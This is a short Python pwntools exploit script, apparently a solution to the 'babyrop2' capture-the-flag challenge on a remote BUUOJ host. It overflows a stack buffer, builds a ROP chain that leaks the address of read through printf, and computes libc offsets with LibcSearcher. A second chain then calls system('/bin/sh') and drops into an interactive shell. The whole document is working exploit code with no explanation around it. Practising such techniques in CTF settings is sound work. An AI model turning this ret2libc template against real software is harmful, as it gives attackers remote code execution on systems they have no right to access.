from pwn import *
from LibcSearcher import *
context.arch='amd64'

# p = process('./babyrop2')
p = remote('node3.buuoj.cn',25002)
elf = ELF('./babyrop2')

pop_rdi = 0x0000000000400733 # pop rdi ; ret

p.recvuntil("What's your name? ")
p.send('A'*0x28+flat([pop_rdi, elf.got['read'], elf.sym['printf'], elf.sym['main']]))
# leak the read addres, and calculate the libc address
p.recvuntil('\n')
read_addr = u64(p.recv(6).ljust(8,'\x00'))
log.success('read_addr = %#x',read_addr)

libc = LibcSearcher('read',read_addr)
libc_base = read_addr - libc.dump('read')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
log.info('system_addr = %#x, binsh_addr = %#x'%(system_addr, binsh_addr))

payload = 'A'*0x28 + flat([pop_rdi, binsh_addr, system_addr, elf.sym['main']])
p.recvuntil("What's your name? ")
p.send(payload)
sleep(1)
p.interactive()

# the path of flag: /home/babyrop2/flag